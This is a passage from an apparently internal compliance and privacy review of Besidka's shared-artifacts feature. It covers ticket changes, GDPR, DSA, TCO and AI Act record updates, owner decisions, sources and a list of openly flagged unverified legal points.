| 4. `compliance-review-2026-10.md` items | Age gate (row 9): gap on storage, closed in A-5. IP leaks section 2.2 (row 5): esm.sh removed; CSP already blocks remote images, fonts and media. DSA section 3.1 (row 1): conclusion unchanged, voluntary process made real. AI Act section 3.2 (row 4): provider framing kept, marking extended. TCO section 3.3 (row 3): the mailbox needs the Art. 15 sentence in the Terms (removal orders, languages), the one-hour mechanism is missing, Polish authority now sourced. Session replay section 2.3: none. Marketing email section 2.4: receipts and statements of reasons are transactional; reporters are not account holders, so they go in the "Reports and notices" paragraph, and owner statements need a registry entry in `shared/utils/account-emails.ts` (generated "Email I send you" list). Breach runbook (row 14): updated. | A-9 updates `compliance-review-2026-10.md` sections 3.1 to 3.3; add the `account-emails.ts` entry. |
| 5. Third-party terms and licences | Libraries (row 6). esm.sh (row 5): none after the change. Cloudflare SSA and Developer Platform terms (row 11). Bridge: the viewer's own provider terms bind the key holder, so the modal says so (row 7); the app-wide Gemini EEA paid-terms rule and the OpenAI key-transfer clause (Agreement 3.3(g)) are not track-specific and not repeated. Turnstile terms: unchanged use. | Owner item 1; A-2 notices file; A-6 modal copy. |
| 6. Monetisation guard | Pass if: no ads, sponsor links, donation links or "made with Besidka Pro" text on `/a/` or in exports; the banner and the sign-in caption are the only Besidka text. Free hosting of third-party content is not income, but `/a/` links used as general web hosting or landing pages would invite exactly that kind of use. | A-7 acceptance: no promotional footer or backlink on `/a/`. Terms: "do not use artifact links as website hosting" (A-9). |
| 7. Accessibility (WCAG 2.2 AA target from P0-14) | Row 15. | A-7 and A-4 acceptance edits. |

## Ticket changes (for the coordinator)

| Plan key | BES id | Change, written as an acceptance-criteria edit |
|---|---|---|
| A-1 | BES-243 | Add nullable `takedownAt`, `takedownReason`, `legalHoldUntil` to `artifacts` (additive, no SQL `DEFAULT`), honoured by owner reads, share reads and the shared-chat read. `deleteArtifacts` and `purgeUserData` skip R2 objects and report rows while `legalHoldUntil` is in the future. `deleteArtifacts` never deletes `artifact_reports`; a cron sweep removes report rows 12 months after closing (24 months for a copyright removal), as the Privacy Policy and Art. 30 row 14a promise. Extend `artifact_reports`: `reporterName`, widen `reason` with `csam`, `terrorism`, `threat-to-life`, `phishing`, add `priority`, `receiptSentAt`, `decision`, `decidedAt`. Optional nullable `modelId` on `artifact_versions` for the export mark. Add `client_id` (nullable) on `artifact_shares` for MCP-created shares. Migration check stays: only CREATE and nullable ADD COLUMN. |
| A-2 | BES-247 | Replace the esm.sh fallback with a pinned, allowlisted vendored set under `/v1/assets/*`; remove `https://esm.sh` from `script-src` and the import map; the acceptance bullet becomes "an allowlisted bare import (for example `recharts`) resolves from the runtime host; an unknown one shows a clear in-frame error and makes no request". Add a licence scan in CI and a generated `THIRD_PARTY_NOTICES.txt` at `/v1/THIRD_PARTY_NOTICES.txt` (React, ReactDOM, Sucrase, Mermaid and its dependencies, marked plus the Gruber notice). Add to the sandbox e2e spec (Chromium and WebKit): `location.href = <other origin>` from the frame is detected by the host (second `load`) and the frame is destroyed; do not state that the frame "cannot send data out". Keep the runtime origin configurable; plan a custom domain instead of `*.workers.dev` for production (owner item 1). |
| A-3 | BES-253 | Tool instructions: no navigation or redirects, no forms that ask for credentials, payment details or personal data, only the allowlisted imports, no remote assets (inline SVG and data URIs). |
| A-4 | BES-259 | `Frame.client.vue`: any iframe `load` after the first removes the frame, shows an error and logs an id-only event. The shared-chat artifact read route returns 410 when the artifact has `takedownAt`. The shared-chat artifact detail view carries `<meta name="ai-generated" content="true">`, the banner text and a Report button that posts to a route keyed by chat share slug and artifact id. `buildStandaloneArtifactHtml` adds `<meta name="ai-generated" content="true">` and an HTML comment "AI-generated by Besidka" (model id only, when stored) and references no third-party host. `.md` and `.svg` exports get a one-line comment mark; `.jsx` and `.mmd` exports do not. |
| A-5 | BES-260 | Every storage route requires `getLegalConsentStatus === 'current'` (as uploads do). Retention: purge non-owner viewer rows 30 days after the last active share ends or is taken down, and on takedown or artifact deletion (owner item 4 decides; default as written). Text must not say the author cannot see viewer data. |
| A-6 | BES-265 | Modal shows the artifact title, "the author of this artifact wrote these prompts, not you and not Besidka", provider and model, the full prompt (scrollable, up to 8,000 characters), maximum cost, remaining calls, and a line that the viewer's provider terms apply. No "Don't ask again" when opened through a share link. Transfer consent for DeepSeek, Moonshot AI and Qwen is asked as for chats. Acceptance: no provider call is made before the consent checks pass (already there) and a test covers the 8,000-character preview. |
| A-7 | BES-269 | Report form: name and email required except for `csam`; categories `csam`, `terrorism`, `threat-to-life`, `phishing`, `copyright`, `privacy`, `illegal`, `harmful`, `other`; `copyright` shows the six notice elements; `threat-to-life` and `terrorism` get `priority` and an email subject prefix. Add an admin "take down by URL, token, artifact id or user" action that needs no report, works at phone width, takes effect on the next request and writes the audit row. Takedown sets the artifact-level fields from A-1 so shared-chat reads stop too; it disables and never deletes. Statement-of-reasons and receipt emails use the A-9 templates. No Web Analytics beacon and no raw token in any log on `/a/**`. No promotional footer on `/a/`. WCAG 2.2 AA acceptance items (row 15). "Never enter passwords or payment details" line under the banner. |
| A-8 | BES-275 | `share_artifact` description states that anyone with the link can view the artifact; the owner's share list shows "created by connected app <name>"; a daily cap on MCP share creation (suggest 10); `docs/mcp-server.md` item 2 records the reason and guard rails. |
| A-9 | BES-281 | Use the input list below. Add: the content-incident runbook (Art. 18, TCO one hour and six-month hold, Cloudflare abuse response), breach-runbook edits (row 14), the consent-wording change, the Cookie Policy and Turnstile edits (shared gate item 2), and `docs/d1-restore-reconciliation.md` entries. |
| A-10 | BES-287 | Add: `artifacts.share` stays grant-only until owner item 1 is decided; eval 12 includes a navigation attempt; a stop rule for any report in the `threat-to-life`, `terrorism` or `csam` categories. |

## Input list for A-9 (BES-281)

Numbering follows BES-281 section 4.

- Art. 30 rows (4.2):
  - Row 23, Artifacts (creation, storage, versions). Data subjects: users, and
    third parties named in artifact text. Data: artifact source, title, kind,
    version hashes, sizes, origin chat id, `createdVia`. Basis: contract
    (Art. 6(1)(b)); special categories the user includes: the Art. 9(2)(a)
    consent. Recipients: Cloudflare (processor). The AI provider only through
    the chat that generated it (row 4). Transfers: Cloudflare section 6.2.
    Retention: until the user deletes it or the account (chat deletion keeps
    it); removed rows survive up to 30 days in backups; a held artifact up to
    six months after a terrorist-content order. Security: M1, M3, M6, plus an
    R2 key derived on the server.
  - Row 24, Artifact viewer storage. Data subjects: signed-in viewers. Data:
    opaque JSON the artifact wrote (100 KB, 64 keys), viewer id, artifact id.
    Basis: contract; Art. 9(2)(a) consent for any special category (wording
    change, owner item 2). Recipients: Cloudflare only; not the owner, not any
    model, not MCP. Retention: artifact deletion, account deletion, the reset
    button, and the post-share purge chosen in owner item 4. Note that the
    author's code receives the values in the viewer's browser.
  - Row 25, Public artifact links. Data subjects: owners, viewers, third
    parties in the content. Data: token hash and encrypted token, expiry,
    pinned version, flags, `createdVia`, MCP client id; viewers' request logs
    (route pattern, status, timing; no raw token). Basis: consent per share
    (as row 13), Art. 6(1)(a); privacy by default (storage and bridge off,
    noindex always). Recipients: anyone with the link, Cloudflare; no search
    engines. Retention: until revoked or expired; copies cannot be recalled.
  - Row 26, Artifact AI calls on the viewer's key. Data subjects: viewers.
    Data: the prompt the artifact wrote plus anything the viewer typed, sent
    through Besidka's server to the viewer's chosen direct provider; the reply
    returns to the artifact; nothing stored by Besidka; usage counts and cost
    logged without text. Basis: contract and the viewer's per-session
    confirmation; Art. 9(2)(a) and Art. 49(1)(a) consents as for chats.
    Recipients: the viewer's provider (independent controller, viewer's own
    account), Cloudflare. Transfers: section 6.1 table. Retention: held by the
    provider under its terms.
  - Row 14a extension: artifact reports (in-app form, Turnstile for anonymous
    reporters, name, email, category, URL, explanation, decision, receipt and
    statement-of-reasons emails); 12 months after closing, 24 months for a
    copyright removal; held content six months under a terrorist-content order;
    authorities as recipients; no IP stored.
  - Row 13 extension: artifacts shown inside a shared chat are public to the
    same audience.
- DPIA rows (4.1):
  - Section 3.12 (a) to (g) as in BES-281, with these changes. (b) Runtime
    isolation: opaque origin, CSP, no bindings; state that a frame can
    navigate itself and that a tripwire destroys it (row 10); no esm.sh. (c)
    Viewer storage: Art. 9 treatment, consent check, the "author's code can
    send it out" limit. (d) Public links: hashed tokens, `tokenEncrypted`,
    noindex, expiry, MCP limits. (e) Reports and takedowns: priority
    categories, no-report takedown, hold, templates. (f) Bridge: modal
    contents, caps, consents. (g) MCP: client id on shares, daily cap.
  - New risk rows (likelihood, severity, built or planned, residual):
    1. Publishing personal data or third-party content in a public artifact
       (medium, high; planned A-7; medium).
    2. A malicious artifact tries to spend the viewer's key or leak prompts
       (medium, medium; planned A-6; low).
    3. Self-navigation sends viewer data or shows a phishing page (medium,
       high; tripwire planned A-2/A-4; medium: the first request has left).
    4. Inference about a viewer's knowledge or health from stored answers
       (medium, medium; consent and no owner access, planned A-5; medium).
    5. Children use quizzes and public links (medium, medium; 18+ gate,
       storage consent check; medium, UNVERIFIED COPPA test).
    6. Cloudflare suspends the account after abuse reports (low to medium,
       high; separation owner item 1; high until decided).
    7. A takedown does not reach every public path, or a one-hour order is
       missed (low, high; planned A-7; low).
    8. A leaked encryption key exposes live share links (low, medium; runbook
       change; low).
    9. An agent publishes content it read (medium, medium; separate scope,
       30 days, cap; medium).
    10. Report records deleted with the artifact defeat the repeat-infringement
        rule and the retention promise (medium, medium; A-1 change; low).
  - Update section 6 (residual risks) and the data-flow view in section 3.10.
- Privacy Policy paragraphs (4.3), with these changes:
  - "Artifacts", "Public artifact links", "Saved progress in artifacts" (add:
    Besidka's staff and the owner do not see it, the author's code can), "AI
    features inside artifacts" (viewer's key, named provider, the author wrote
    the prompts, the viewer's provider terms apply, nothing stored by
    Besidka).
  - Drop "Libraries loaded by artifacts" as a disclosure (no esm.sh); say
    libraries are served from the runtime host.
  - "Connected AI apps": list `artifacts:read`, `artifacts:write`,
    `artifacts:share`; say shares are public links of at most 30 days.
  - "Who else receives your data", "Transfers outside the EU" (bridge uses
    section 6.1 recipients), "How long I keep things" (report and hold
    periods, viewer storage), "Reports and notices about content" (in-app
    form; reporter name and email; receipts go to reporters who are not
    account holders).
  - State explicitly: no new cookie. Edit the Turnstile paragraph and the
    Cloudflare row (Turnstile now also runs on the report modal), and name the
    runtime host as a place the viewer's IP address goes.
- Terms of Use paragraphs (4.4), with these changes:
  - "Share links": artifact links (what you promise, revoking is not undoing,
    MCP links expire within 30 days, anyone with the link can view).
  - "What you may not do": artifacts that phish, impersonate, imitate a login
    or payment form, ask visitors for credentials or personal data, redirect
    visitors, try to spend viewers' keys, are aimed at children under 13, or
    serve as general website hosting.
  - "Reporting illegal content": replace "There is no form to fill in" (a form
    now exists, email still works); name and email rule unchanged; categories;
    a sentence on terrorist-content policy (TCO Art. 7(1)); a sentence that
    removal orders go to the same mailbox, with its languages (TCO Art. 15);
    threat-to-life sentence stays.
  - "Statement of reasons": artifact takedown and sharing restriction.
  - "Content moderation": a person opens reported artifacts; no automated
    scanning (unchanged).
  - "You are interacting with an AI system": artifacts are AI-generated; the
    banner; exports carry a mark where the format allows.
  - Costs of your key: bridge calls count.
- Cookie Policy paragraphs (not in BES-281 section 4; add them):
  - Turnstile pages list, the summary sentence, the "Cookies set by other
    companies" list, any new `sessionStorage` key (shared gate item 2).
- AI Act / DSA records (4.5, 4.6):
  - `compliance-review-2026-10.md` section 3.2: artifacts marked by banner,
    badge, `<meta name="ai-generated">` on `/a/` and shared-chat views, a meta
    plus comment in `.html` exports, a comment mark in `.md` and `.svg`
    exports; `.jsx` and `.mmd` unmarked as source code (guidelines para 68);
    provider framing kept; open points (SVG, whether the meta tag is enough,
    whether the Art. 111(4) grace covers a feature added after 2.8.2026).
  - Section 3.1: conclusion unchanged, artifacts increase exposure, Art. 18
    path added; section 3.3: ABW authority, Art. 15 contact point and languages, one-hour
    mechanism, six-month hold.
  - DSA templates: receipt to reporter (Art. 16(4)), decision to reporter with
    redress (Art. 16(5)), statement of reasons to the owner with the Art.
    17(3) elements, a TCO owner notice (Art. 11).
  - New runbook for content incidents (Art. 18, TCO, Cloudflare abuse).
- Materiality, `LEGAL_NOTICES`, `CURRENT_CONSENT_VERSION` expectation:
  - Material for Privacy Policy and Terms; one `LEGAL_NOTICES` entry (suggest
    id `2026-NN-artifacts`, documents `privacy-policy` and `terms-of-use`),
    30-day notice published before the rollout beyond `internal`; run
    `pnpm run legal:hash`.
  - `CURRENT_CONSENT_VERSION`: expect a bump if owner item 2 option A is
    chosen (everyone re-confirms the Terms and consent together); no bump
    under option C.
  - Also add `docs/d1-restore-reconciliation.md` entries and the breach
    runbook edits.

## Owner items

1. **Cloudflare separation for public sharing.** Options: (A) full separation:
   public page, content read path, R2 store and runtime on a separate
   registrable domain in a second Cloudflare account (a domain fee, a second
   account and deploy job, a small separate shell for `/a/`); (B) runtime only
   in a second account (cheap, but reports and content still sit in the main
   account, so it separates almost nothing); (C) same account, keep the
   grant-only beta, a kill switch and an abuse-response runbook, and accept
   that one abuse report can reach the account that runs besidka.com.
   Recommendation: C for the invited beta, A before any wider public sharing;
   do not choose B. A-1 and A-2 can start either way.
2. **Consent wording for artifacts.** The consent box names chats, projects and
   files. Options: (A) widen the wording to cover artifact answers saved by
   viewers and prompts an artifact sends, and bump `CURRENT_CONSENT_VERSION`
   (one re-prompt for everyone, sending paused until each user answers);
   (B) leave it and rely on "information I choose to include" (weaker: specific
   and informed consent is the point); (C) a separate first-use consent for
   artifact storage and the bridge (more code, an additive column, no global
   re-prompt). Recommendation: A, timed with the rollout beyond `internal`.
3. **A phone alert for the contact mailbox.** The one-hour terrorist-content
   rule and Art. 18 depend on seeing the email. Set a push alert for the
   privacy mailbox on your phone and say who covers when you are away.
   Recommendation: do it before `artifacts.share` is turned on for anyone.
4. **Viewer progress after a share ends.** A-5 keeps it so a re-share restores
   progress. Options: keep until the artifact or account is deleted (current
   design, thin on storage limitation); purge non-owner viewer rows 30 days
   after the last active share ends; purge at once on revoke. Recommendation:
   purge after 30 days, and at once on takedown.

## Sources

| Source | URL | Page date | Accessed |
|---|---|---|---|
| DSA, Regulation (EU) 2022/2065, Arts. 2, 3, 6, 11, 12, 14, 15, 16, 17, 18, 19, 24; Recitals 13, 14 | https://eur-lex.europa.eu/eli/reg/2022/2065/oj | none shown | 2026-11-07 |
| Commission Recommendation 2003/361/EC, Annex Arts. 1, 2 | https://eur-lex.europa.eu/legal-content/EN/TXT/HTML/?uri=CELEX:32003H0361 | none shown | 2026-11-07 |
| TCO Regulation (EU) 2021/784, Arts. 1, 2, 3, 6, 7, 10, 11, 12, 14, 15, 18(2) and recital 45 | https://eur-lex.europa.eu/legal-content/EN/TXT/HTML/?uri=CELEX:32021R0784 | none shown | 2026-11-07 (Arts. 6, 7, 10, 11, 12, 14 re-read 2026-11-08 from the saved copy) |
| AI Act, Regulation (EU) 2024/1689, Arts. 3, 50, 111, 113, as amended by Regulation (EU) 2026/1744 | https://eur-lex.europa.eu/legal-content/EN/TXT/HTML/?uri=CELEX:32024R1689 ; https://eur-lex.europa.eu/legal-content/EN/TXT/HTML/?uri=CELEX:32026R1744 | OJ L 24.7.2026 for the amending act | 2026-11-07 |
| Commission guidelines on AI Act Art. 50, paras 11, 67, 68, 73, 74 (also cited through `compliance-review` section 3.2) | https://digital-strategy.ec.europa.eu/en/library/guidelines-transparency-obligations-providers-and-deployers-ai-systems ; PDF https://ec.europa.eu/newsroom/dae/redirection/document/131215 | published 20 July 2026, page last updated 5 November 2026 | 2026-11-08 |
| Directive (EU) 2019/790, Art. 2(6), Art. 17, recital 62 | https://eur-lex.europa.eu/legal-content/EN/TXT/HTML/?uri=CELEX:32019L0790 | none shown | 2026-11-08 |
| Polish DSA act, Dz.U. 2026 poz. 1296, art. 2 pkt 1b, 15a-15b, 22zzn, 22zzo, 22zzp | https://api.sejm.gov.pl/eli/acts/DU/2026/1296/text.pdf | published 2026-10-06, in force 2026-11-06 | 2026-11-07 |
| Polish act of 18 October 2024, Dz.U. 2024 poz. 1684, art. 26a-26h (TCO) | https://api.sejm.gov.pl/eli/acts/DU/2024/1684/text.html ; metadata https://api.sejm.gov.pl/eli/acts/DU/2024/1684 | announced 2024-10-18, in force 2024-12-03 | 2026-11-08 |
| esm.sh landing page, README, LICENSE, HOSTING.md | https://esm.sh ; https://raw.githubusercontent.com/esm-dev/esm.sh/main/README.md | none shown | 2026-11-07 |
| Cloudflare Self-Serve Subscription Agreement | https://www.cloudflare.com/terms/ | last updated 2025-09-12 | 2026-11-07 |
| Cloudflare Our approach to abuse | https://www.cloudflare.com/trust-hub/abuse-approach/ | none shown | 2026-11-07 |
| Cloudflare Service-Specific Terms, Developer Platform | https://www.cloudflare.com/service-specific-terms-developer-platform/ | last updated 2026-09-28 | 2026-11-07 |
| LICENSE files: React, Sucrase, Mermaid, marked | https://github.com/facebook/react ; https://github.com/alangpierce/sucrase ; https://github.com/mermaid-js/mermaid ; https://github.com/markedjs/marked (LICENSE at repo root) | none | 2026-11-07 |
| Provider data-use terms (Anthropic retention, Gemini EEA rule) | `research/provider-training.md` (Anthropic: https://privacy.claude.com/en/articles/7996866-how-long-do-you-store-my-organization-s-data, date shown 2026-07-01; Gemini: https://aistudio.google.com/docs/terms, effective 2026-03-23) | as listed | 2026-11-07 |
| Playwright test of iframe self-navigation | drafting agent's local test page, Chromium and WebKit; reviewer re-run | n/a | 2026-11-07 UTC (re-run 2026-11-08) |
| Repo: `docs/legal/compliance-review-2026-10.md` (2.1, 2.2, 3.1 to 3.3), `docs/legal-memory-sensitive-data.md`, `docs/legal/dpia.md` (3.8, 3.8a, 5), `docs/legal/art30-record.md`, `docs/legal/breach-runbook.md`, `docs/mcp-server.md`, `content/legal/terms-of-use.md`, `content/legal/privacy-policy.md`, `content/legal/cookie-policy.md`, `app/components/Legal/ConsentModal.client.vue` | repo paths | n/a | 2026-11-08 |
| Linear tickets BES-305, 281, 303, 243, 247, 259, 260, 265, 269, 275, 287 (read only) | https://linear.app/besidka/issue/BES-305 and siblings | ticket text as of 2026-11-07 | 2026-11-08 |

## Unverified

- Whether the Polish police or prosecutor, or another body, is the right
  recipient for a DSA Art. 18 notice. Settles it: counsel (`radca prawny`) or
  the competent prosecutor's office guidance.
- How the TCO fine of up to 4% (Dz.U. 2024 poz. 1684 art. 26f) applies to a
  provider with no turnover, and whether the remuneration argument also removes
  Besidka from the TCO. Settles it: counsel; no case law found.
- Whether a free personal project is an "enterprise" under Recommendation
  2003/361 Art. 1, and whether the Recommendation was replaced by 2026-11-07.
- TCO Arts. 5 and 17 were not read, and Art. 18 only for its penalty factors
  (Arts. 1, 2, 3, 6, 7, 10, 11, 12, 14 and 15 were read). Settles it: reading
  them; no micro or small exemption was seen in the articles read, and size is
  only a penalty factor in Art. 18(2)(f).
- The Polish DSA act (Dz.U. 2026 poz. 1296) was read for its penalty chapter
  only. Not read: the procedures on orders (DSA Arts. 9 and 10), complaint
  handling, the Rada ds. Usług Cyfrowych, and any carve-out for non-commercial
  providers. This is the point that matters for the `usługodawca` argument in
  row 1. Settles it: reading the full act, then counsel.
- Whether AI Act Art. 2(12) (open-source exemption, flagged as not verified in
  `compliance-review` section 3.2) is relevant to an Art. 50 system at all.
  Settles it: its text and whether it excludes Art. 50 systems.
- Whether a rendered HTML artifact, an SVG illustration or a Markdown file is
  in or out of AI Act Art. 50(2) (guidelines para 68 excludes source code;
  rendered pages and Markdown are not clearly covered), and whether a
  `<meta name="ai-generated">` tag meets "effective, interoperable, robust".
  Settles it: Commission or market-surveillance guidance on text marking, and
  any standard under Art. 50(7) or Art. 40.
- Whether a feature added after 2.8.2026 to a system placed on the market
  before it keeps the Art. 111(4) grace to 2.12.2026. Settles it: Commission
  guidance on Art. 111(4).
- Consumer-law reading of the viewer-key bridge (unfair terms, transparency of
  spend): no source was read for row 7. Settles it: Directive 93/13/EEC Arts. 3
  and 5 and the Unfair Commercial Practices Directive, then counsel.
- Whether a private non-gainful person is a `usługodawca` under UŚUDE art. 2
  pkt 6, so within art. 22zzn (repo reading in `compliance-review` section 3.1;
  not re-read). Settles it: the UŚUDE text and counsel.
- Whether the `navigate-to` CSP directive is gone from every engine in 2026.
  The test shows it is not effective in Chromium (build 1248) and WebKit
  (build 2370) for the header used; Firefox was not run.
- Whether A-2's real runtime Worker behaves like the harness (the harness had
  no `frame-ancestors`). Settles it: the A-2 Playwright spec.
- esm.sh's operator entity, jurisdiction, origin hosting and logging. Now moot
  for Besidka because it is dropped, but still unknown.
- Whether esm.sh itself runs on Workers (not needed).
- Mermaid's transitive licences (per dependency) and whether a licence scan
  flags anything. Settles it: the A-2 CI scan.
- Whether browser or search-engine blocklists flag a whole host or a path when
  a user artifact is reported. Settles it: the vendors' published policies.
- Whether Cloudflare Web Analytics loads on `/a/**` after consent and records
  the path. Settles it: a check of the layout that injects the beacon.
- Whether P0-14's merged wording of the WCAG 2.2 AA decision matches its
  ticket text. Settles it: the merged `docs/legal/agentic-capabilities-precheck.md`.
- Whether Besidka would be "directed to children" for COPPA because users
  publish child-aimed artifacts. Settles it: FTC guidance re-read and counsel.
- Cloudflare workers.dev-specific abuse handling beyond the policy text, and
  Cloudflare's separate complaint-types page (not fetched).
- Whether the Art. 49(1)(a) consent used for repeated bridge calls is adequate
  for repeated transfers (the existing DPIA residual risk; counsel question
  already open in `docs/legal-memory-sensitive-data.md`).
